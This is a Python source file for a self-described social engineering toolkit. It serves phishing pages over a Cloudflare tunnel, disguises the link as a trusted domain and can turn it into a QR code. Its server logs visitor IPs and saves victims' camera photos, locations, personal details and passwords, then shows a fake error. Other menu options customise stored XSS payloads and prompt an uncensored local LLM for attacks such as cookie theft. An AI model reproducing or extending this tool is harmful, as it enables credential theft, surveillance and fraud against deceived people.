import os
import subprocess
import threading
import socketserver
import http.server
import re
import shutil
import json
import requests
import datetime
from urllib.parse import urlparse
import time
from colorama import init, Fore, Style
import qrcode

def mask_url_with_facad1ng_cli(public_url):
    """Mask URL using Facad1ng CLI tool."""
    domain = input("Enter custom domain (e.g. gmail.com): ").strip()
    keyword = input("Enter keyword/path (e.g. login): ").strip()
    command = ["Facad1ng", public_url, domain, keyword]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        print("\nFacad1ng Output:")
        print(stdout.decode())
        if stderr:
            print("Facad1ng Error:")
            print(stderr.decode())

        print("Facad1ng completed successfully.\n" if process.returncode == 0 
              else f"Facad1ng exited with code {process.returncode}.\n")
    except FileNotFoundError:
        print("Error: 'Facad1ng' command not found. Make sure facad1ng is installed and in your PATH.\n")
        return public_url

    # Parse masked URL from stdout
    for line in reversed(stdout.decode().splitlines()):
        line = line.strip()
        if line.startswith(("http://", "https://")):
            return line
    return public_url

init(autoreset=True)

BRIGHT_GREEN = Style.BRIGHT + Fore.GREEN
BRIGHT_RED = Style.BRIGHT + Fore.RED
RESET = Style.RESET_ALL


def print_banner():
    ascii_art = r''' 
                                    _H_
                                   /___\
                                   \srn/
~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~U~^~^~^~^~^~^~
                      ~              |
      ~                        o     |        ~
                ___        o         |
       _,.--,.'`   `~'-.._    O      |
      /_  .-"      _   /_\'.         |   ~
     .-';'       (( `  \0/  `\       #
    /__;          ((_  ,_     |  ,   #
    .-;                  \_   /  #  _#,
   /  ;    .-' /  _.--""-.\`~`   `#(('\\        ~
   ;-';   /   / .'                  )) \\
       ; /.--'.'                   ((   ))
        \     |        ~            \\ ((
         \    |                      )) `
   ~      \   |                      `
           \  |
           .` `""-.
         .'        \         ~               ~
         |    |\    |
         \   /  '-._|
          \.'

 '''
    print(Fore.GREEN + ascii_art)
    print(Fore.RED + "[~~~]  Social Engineering toolkit    [~~~]")
    print(Fore.RED + "[___] Creators: Saksham, Rajeshwar, Nishant [___]\n")


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_BASE_DIR = os.path.join(SCRIPT_DIR, "templates")
TEMPLATES_BASE_DIR2 = os.path.join(SCRIPT_DIR, "templates2")

class SingleFileUploadHandler(http.server.SimpleHTTPRequestHandler):
    logged_ips = set()

    def __init__(self, *args, target_file=None, **kwargs):
        self.template_filename = target_file
        super().__init__(*args, **kwargs)

    def log_client_ip_once(self):
        ip = self.client_address[0]
        if ip not in self.logged_ips:
            self.logged_ips.add(ip)
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            try:
                with open('ipaddress.txt', 'a') as logfile:
                    logfile.write(f'{timestamp} - {ip}\n')
                print(f"{Fore.CYAN}[+] Logged IP {ip}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Logging IP failed: {e}{Style.RESET_ALL}")

    def do_GET(self):
        # Only serve the target file, never allow directory listing
        main_html = '/' + os.path.basename(self.template_filename)
        if urlparse(self.path).path in ['/', main_html]:
            self.log_client_ip_once()
            self.path = main_html
        return super().do_GET()

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path.lower().rstrip('/')
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        try:
            if path == '/upload':
                filename = f'photo_{int(time.time() * 1000)}.png'
                with open(filename, 'wb') as f:
                    f.write(post_data)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Photo saved successfully")
                print(f"{Fore.GREEN}[+] Saved photo: {filename}{Style.RESET_ALL}")
            elif path == '/location':
                with open('location.txt', 'w') as f:
                    f.write(post_data.decode('utf-8'))
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Location saved successfully")
                print(f"{Fore.GREEN}[+] Saved location{Style.RESET_ALL}")
            elif path == '/input':
                data = json.loads(post_data.decode('utf-8'))
                name, email, phone, address = (data.get(k) for k in ('name','email','phone','address'))
                with open('input.txt', 'a', encoding='utf-8') as f:
                    if any([name,email,phone,address]):
                        f.write(f"Name: {name}, Email: {email}, Phone: {phone}, Address: {address}\n")
                        print(f"{Fore.YELLOW}[+] Logged data - Name: {name}, Email: {email}, Phone: {phone}, Address: {address}{Style.RESET_ALL}")
                    else:
                        f.write(f"UserID: {data.get('userid','')} Password: {data.get('password','')}\n")
                        print(f"{Fore.YELLOW}[+] Logged credentials: {data.get('userid','')} / {data.get('password','')}{Style.RESET_ALL}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"Server error try again")
            else:
                self.send_error(404, "Endpoint not found")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Server error try again")
            print(f"{Fore.RED}[!] Failed to process POST: {e}{Style.RESET_ALL}")

    def list_directory(self, path):
        self.send_error(403, "Directory listing not allowed")
        return None

def input_with_default(prompt, default):
    val = input(f"{prompt} [{default}]: ").strip()
    return val if val else default

def select_from_list(items, prompt, allow_quit=True):
    if not items:
        print(Fore.YELLOW + "No items to select." + Style.RESET_ALL)
        return None
    for idx, item in enumerate(items,1):
        print(f"{idx}. {item}")
    if allow_quit:
        print("q. Cancel")
    choice = input(f"{prompt} (number): ").strip().lower()
    if allow_quit and choice == 'q':
        return None
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(items):
            return items[idx]
        else:
            raise ValueError
    except Exception:
        print(Fore.RED + "Invalid choice." + Style.RESET_ALL)
        return None

class SocialEngineeringToolkitMenu:
    def __init__(self):
        self.template_filename = None
        self.menu_options = {
            '1': self.stored_xss_script,
            '2': self.use_template_and_expose_singlefile,
            '3': self.payload_generator,
            '4': self.phishing_template,
            '5': self.cleanup_logs_and_photos,
        }

    def display_menu(self):
        print(BRIGHT_GREEN + "Select from the menu:")
        opts = [
            "1. Stored XSS Scripts (Customize Templates)",
            "2. Use Template & Expose Public URL (with logging)",
            "3. Payload Generator (BombGPT via Ollama)",
            "4. Phishing Templates (Customize Templates)",
            "5. Cleanup Logs & Photos",
            "q. Exit"
        ]
        print('\n'.join([BRIGHT_GREEN + o for o in opts]))

    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.GREEN + "Enter your choice: ").strip()
            if choice.lower() in ['q', 'exit']:
                print(Fore.GREEN + "Exiting toolkit. Goodbye!")
                break
            func = self.menu_options.get(choice, self.invalid_choice)
            func()
            input(Fore.GREEN + "Press Enter to continue...")

    def list_templates_in_category(self, category):
        category_dir = os.path.join(TEMPLATES_BASE_DIR, category)
        if not os.path.isdir(category_dir):
            print(Fore.RED + f"Template category directory '{category_dir}' not found." + Style.RESET_ALL)
            return []
        return [f for f in os.listdir(category_dir) if f.lower().endswith('.html')]

    def customize_template(self, template_path):
        try:
            with open(template_path, 'r', encoding='utf-8') as f:
                template = f.read()
        except Exception as e:
            print(Fore.RED + f"Error reading template file: {e}" + Style.RESET_ALL)
            return None

        placeholders = set(re.findall(r'\[([A-Z_]+)\]', template))
        if not placeholders:
            print(Fore.YELLOW + "No placeholders found to customize in this template.")
            return template_path

        print(Fore.CYAN + "\nDetected placeholders:")
        for ph in placeholders:
            print(f" - {ph}")
        replacements = {ph: input(f"Enter value for '{ph}': ").strip() for ph in placeholders}
        for ph, val in replacements.items():
            template = template.replace(f"[{ph}]", val)
        out_file = f"customized_{os.path.basename(template_path)}"
        try:
            with open(out_file, 'w', encoding='utf-8') as f:
                f.write(template)
            print(Fore.GREEN + f"Customized template saved as '{out_file}'" + Style.RESET_ALL)
            return out_file
        except Exception as e:
            print(Fore.RED + f"Failed to save customized template: {e}" + Style.RESET_ALL)
            return None

    def stored_xss_script(self):
        print(Fore.CYAN + "\n[XSS Payload Template Customizer]\n" + Style.RESET_ALL)
        category = "xss"
        templates = self.list_templates_in_category(category)
        chosen = select_from_list(templates, "Template to customize")
        if not chosen: return
        customized_file = self.customize_template(os.path.join(TEMPLATES_BASE_DIR, category, chosen))
        if customized_file:
            print(Fore.GREEN + f"\nCustomized XSS template saved as '{customized_file}'. You can serve it via option 3." + Style.RESET_ALL)

    def phishing_template(self):
        print(Fore.CYAN + "\n[Phishing Template Scan]\n" + Style.RESET_ALL)
        phishing_base = os.path.join(TEMPLATES_BASE_DIR, "phishing")
        if not os.path.isdir(phishing_base):
            print(Fore.RED + f"Phishing templates directory '{phishing_base}' not found." + Style.RESET_ALL)
            return

        subfolders = [f for f in os.listdir(phishing_base) if os.path.isdir(os.path.join(phishing_base, f))]
        if not subfolders:
            print(Fore.YELLOW + "No phishing template folders found." + Style.RESET_ALL)
            return

        print(Fore.YELLOW + "Available phishing template folders and their HTML files:\n" + Style.RESET_ALL)
        for idx, folder in enumerate(subfolders, 1):
            folder_path = os.path.join(phishing_base, folder)
            html_files = [f for f in os.listdir(folder_path) if f.lower().endswith(".html")]
            print(f"{idx}. {folder}:")
            print("   - " + "\n   - ".join(html_files or ["(No HTML files found in this folder)"]))
            if "base.html" in os.listdir(folder_path):
                print("   [!] Found base.html (contains essential scripts)")
            if "README.txt" in os.listdir(folder_path):
                print("   [!] Found README.txt with instructions")
        print(Fore.CYAN + "\n[!] Disclaimer: These are template folders. You must add essentials (e.g., camera access, location, etc.) from any base file or instructions provided." + Style.RESET_ALL)

    def use_template_and_expose_singlefile(self):
        print(Fore.CYAN + "\n[Template Picker]\n" + Style.RESET_ALL)
        if not os.path.isdir(TEMPLATES_BASE_DIR2):
            print(Fore.RED + "Templates directory not found." + Style.RESET_ALL)
            return
        # Directly list HTML files in TEMPLATES_BASE_DIR2 (no subfolders)
        html_files = [f for f in os.listdir(TEMPLATES_BASE_DIR2) if f.lower().endswith(".html")]
        if not html_files:
            print(Fore.YELLOW + "No HTML files found in templates2 directory." + Style.RESET_ALL)
            return
        chosen_file = select_from_list(html_files, "Select HTML file to serve")
        if not chosen_file:
            return
        folder_path = TEMPLATES_BASE_DIR2

        serve_dir = folder_path
        serve_file = chosen_file
        try:
            port = int(input_with_default(f"{BRIGHT_GREEN}Enter port to serve template", 8080))
        except ValueError:
            print(f"{Fore.RED}Invalid port number. Using 8080.{RESET}")
            port = 8080

        socketserver.TCPServer.allow_reuse_address = True
        handler_class = lambda *a, **k: SingleFileUploadHandler(*a, target_file=serve_file, directory=serve_dir, **k)
        httpd = socketserver.TCPServer(("", port), handler_class)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        print(f"{BRIGHT_GREEN}Server running at http://localhost:{port} ...{RESET}")

        if not shutil.which('cloudflared'):
            print(f"{Fore.RED}cloudflared not installed. Tunnel failed.{RESET}")
            httpd.shutdown()
            return
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1
        )
        public_url = None

        for _ in range(20):
            line = proc.stdout.readline()
            if not line:
                continue
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                public_url = match.group(0)
                print(f"\n{BRIGHT_GREEN}Public URL: {public_url}{RESET}")

                # 🔥 Facad1ng masking prompt
                final_url = public_url  # Default final URL

                while True:
                    choice = input("Do you want to mask the public URL using facad1ng CLI? (y/n): ").strip().lower()
                    if choice in ['y', 'yes']:
                        masked_url = mask_url_with_facad1ng_cli(public_url)
                        final_url = masked_url
                        print(f"\n{BRIGHT_GREEN}Final URL to share: {final_url}{RESET}\n")
                        break
                    elif choice in ['n', 'no']:
                        print(f"\n{BRIGHT_GREEN}Final URL to share: {final_url}{RESET}\n")
                        break
                    else:
                        print("Please enter 'y' or 'n'.")
                # End of masking

                # QR Code generation prompt
                qr_choice = input("Do you want to generate a QR code for this URL? (y/n): ").strip().lower()
                if qr_choice in ['y', 'yes']:
                    filename = input("Enter filename to save QR code (without .png, default 'qrcode'): ").strip()
                    if not filename:
                        filename = "qrcode"
                    try:
                        qr_img = qrcode.make(final_url)
                        filepath = f"{filename}.png"
                        qr_img.save(filepath)
                        print(f"{BRIGHT_GREEN}QR Code saved as '{filepath}'{RESET}")
                    except Exception as e:
                        print(f"{Fore.RED}Failed to generate/save QR code: {e}{RESET}")

                break  # Exit reading loop once URL fetched and processed

        if public_url:
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"{BRIGHT_RED}\nShutting down...{RESET}")
                httpd.shutdown()
                proc.terminate()

    def payload_generator(self):
        print(Fore.CYAN + "\n[🤖 BombGPT via Ollama LLM]\n" + Style.RESET_ALL)
        prompt = input("Enter your prompt (e.g., 'steal cookies using JS'): ").strip()
        if not prompt:
            print(Fore.RED + "[-] Prompt cannot be empty."); return
        print(Fore.CYAN + "[*] Generating payload using Dolphin LLM...")
        try:
            response = requests.post(
                "http://localhost:11434/api/chat",
                json={
                    "model": "dolphin-custom",
                    "messages": [{"role": "user", "content": prompt}]
                },
                stream=True,
                timeout=60
            )
            response.raise_for_status()
            print(Fore.GREEN + "\n[+] Response from dolphin-custom:\n")
            buffer = []
            for line in response.iter_lines():
                if not line: continue
                try:
                    data = json.loads(line.decode("utf-8"))
                    piece = data.get("message", {}).get("content", "")
                    print(piece, end="", flush=True)
                    buffer.append(piece)
                    if data.get("done"):
                        break
                except Exception: pass
            print(Fore.CYAN + "\n\n[*] Done generating.")
        except Exception as e:
            print(Fore.RED + f"[-] Error during model call: {e}")

    def cleanup_logs_and_photos(self):
        print(f"{BRIGHT_GREEN}[*] Cleaning up logs and photos...{RESET}")
        patterns = [("photo_", ".png"), "location.txt", "input.txt", "ipaddress.txt"]
        deleted = 0
        for f in os.listdir():
            if (f.startswith("photo_") and f.endswith(".png")) or f in patterns[1:]:
                try:
                    os.remove(f)
                    deleted += 1
                except Exception:
                    pass
        print(f"{Fore.YELLOW}[+] Deleted {deleted} file(s). Cleanup complete.{RESET}")

    def invalid_choice(self):
        print(Fore.RED + "Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    print_banner()
    menu = SocialEngineeringToolkitMenu()
    menu.run()
